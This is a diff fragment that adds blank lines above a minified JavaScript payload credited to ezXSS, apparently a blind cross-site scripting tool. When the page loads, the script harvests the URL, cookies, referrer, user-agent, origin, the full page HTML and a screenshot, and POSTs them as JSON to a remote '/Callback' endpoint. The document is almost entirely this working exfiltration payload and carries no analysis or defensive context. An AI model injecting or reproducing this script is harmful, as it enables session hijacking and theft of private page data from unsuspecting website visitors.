@@ -1,4 +1,6 @@
 
+
+
 // github.com/ssl/ezXSS
 function ez_n(a){return void 0!==a?a:""}function ez_cb(a){var b=new XMLHttpRequest;b.open("POST",ez_domain+"/Callback",!0),b.setRequestHeader("Content-type","text/plain"),b.onreadystatechange=function(){4==b.readyState&&200==b.status},b.send(JSON.stringify(a))}function ez_hL(){try{ez_rD.uri=ez_n(location.toString())}catch(a){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(a){ez_rD.cookies=""}try{ez_rD.referrer=ez_n(document.referrer)}catch(a){ez_rD.referrer=""}try{ez_rD["user-agent"]=ez_n(navigator.userAgent)}catch(a){ez_rD["user-agent"]=""}try{ez_rD.origin=ez_n(location.origin)}catch(a){ez_rD.origin=""}try{try{ez_rD.dom=ez_n(document.documentElement.outerHTML)}catch(a){ez_rD.dom=""}html2canvas(document.body).then(function(a){ez_rD.screenshot=a.toDataURL(),ez_c()})}catch(a){ez_rD.screenshot="",ez_c()}}function ez_c(){ez_cb(ez_rD)}function ez_aE(a,b,c){a.addEventListener?a.addEventListener(b,c,!1):a.attachEvent&&a.attachEvent("on"+b,c)}ez_rD={},"complete"==document.readyState?ez_hL():ez_aE(window,"load",function(){ez_hL()});
 
